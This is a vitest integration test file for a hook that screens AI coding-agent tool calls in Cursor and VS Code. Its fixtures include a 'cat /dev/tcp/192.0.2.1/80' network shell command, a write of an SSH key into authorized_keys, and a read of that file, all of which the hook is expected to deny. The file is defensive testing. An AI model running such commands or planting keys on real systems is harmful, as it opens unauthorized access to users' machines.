import { execFile } from "node:child_process";
import { resolve } from "node:path";
import { describe, expect, it } from "vitest";

const DIST_DIR = resolve(__dirname, "..", "..", "dist");
const SAGE_HOOK = resolve(DIST_DIR, "sage-hook.cjs");
type HookMode = "cursor" | "vscode";

function runHook(
	mode: HookMode,
	input: Record<string, unknown> | string | Buffer,
): Promise<{ stdout: string; stderr: string; code: number | null }> {
	return new Promise((resolveRun) => {
		const child = execFile("node", [SAGE_HOOK, mode], (error, stdout, stderr) => {
			resolveRun({ stdout, stderr, code: error?.code ? Number(error.code) : child.exitCode });
		});
		const stdin = Buffer.isBuffer(input)
			? input
			: typeof input === "string"
				? input
				: JSON.stringify(input);
		child.stdin?.end(stdin);
	});
}

function parseResponse(stdout: string): Record<string, unknown> {
	return JSON.parse(stdout.trim()) as Record<string, unknown>;
}

describe("Cursor hook integration", () => {
	it("allows clean preToolUse write", async () => {
		const { stdout, code } = await runHook("cursor", {
			hook_event_name: "preToolUse",
			tool_name: "Write",
			tool_input: {
				file_path: "/tmp/notes.txt",
				content: "just some notes",
			},
		});

		expect(code).toBe(0);
		expect(parseResponse(stdout)).toEqual({ decision: "allow" });
	});

	it("parses UTF-16LE stdin payloads (Windows hook launcher)", async () => {
		const payload = {
			hook_event_name: "preToolUse",
			tool_name: "Write",
			tool_input: {
				file_path: "/home/user/.ssh/authorized_keys",
				content: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ...",
			},
		};

		const { stdout, code } = await runHook(
			"cursor",
			Buffer.from(JSON.stringify(payload), "utf16le"),
		);

		expect(code).toBe(0);
		const response = parseResponse(stdout);
		expect(response.decision).toBe("deny");
		expect(typeof response.reason).toBe("string");
	});

	it("denies sensitive write in preToolUse", async () => {
		const { stdout, code } = await runHook("cursor", {
			hook_event_name: "preToolUse",
			tool_name: "Write",
			tool_input: {
				file_path: "/home/user/.ssh/authorized_keys",
				content: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ...",
			},
		});

		expect(code).toBe(0);
		const response = parseResponse(stdout);
		expect(response.decision).toBe("deny");
		expect(typeof response.reason).toBe("string");
	});

	it("denies suspicious shell command", async () => {
		const { stdout, code } = await runHook("cursor", {
			hook_event_name: "beforeShellExecution",
			command: "cat /dev/tcp/192.0.2.1/80",
			cwd: "/tmp",
		});

		expect(code).toBe(0);
		const response = parseResponse(stdout);
		expect(response.permission).toMatch(/^(deny|ask)$/);
	});

	it("denies sensitive file read", async () => {
		const { stdout, code } = await runHook("cursor", {
			hook_event_name: "beforeReadFile",
			file_path: "/home/user/.ssh/authorized_keys",
			content: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ...",
			attachments: [],
		});

		expect(code).toBe(0);
		const response = parseResponse(stdout);
		expect(response.permission).toBe("deny");
	});

	it("allows benign mcp call", async () => {
		const { stdout, code } = await runHook("cursor", {
			hook_event_name: "beforeMCPExecution",
			tool_name: "MCP",
			tool_input: {
				query: "repo metadata",
			},
		});

		expect(code).toBe(0);
		const response = parseResponse(stdout);
		expect(response.permission).toBe("allow");
	});

	it("fails open on invalid json", async () => {
		const { stdout, code } = await runHook("cursor", "not valid json");

		expect(code).toBe(0);
		expect(parseResponse(stdout)).toEqual({});
	});
});

describe("VS Code hook integration", () => {
	it("allows clean PreToolUse write", async () => {
		const { stdout, code } = await runHook("vscode", {
			tool_name: "Write",
			tool_input: {
				file_path: "/tmp/notes.txt",
				content: "just some notes",
			},
		});

		expect(code).toBe(0);
		expect(parseResponse(stdout)).toEqual({});
	});

	it("returns blocking verdict for sensitive write", async () => {
		const { stdout, code } = await runHook("vscode", {
			tool_name: "Write",
			tool_input: {
				file_path: "/home/user/.ssh/authorized_keys",
				content: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ...",
			},
		});

		expect(code).toBe(0);
		const response = parseResponse(stdout);
		const hookSpecificOutput = response.hookSpecificOutput as Record<string, unknown>;
		expect(hookSpecificOutput.hookEventName).toBe("PreToolUse");
		expect(hookSpecificOutput.permissionDecision).toMatch(/^(deny|ask)$/);
		expect(typeof hookSpecificOutput.permissionDecisionReason).toBe("string");
	});

	it("fails open on invalid json", async () => {
		const { stdout, code } = await runHook("vscode", "not valid json");

		expect(code).toBe(0);
		expect(parseResponse(stdout)).toEqual({});
	});
});
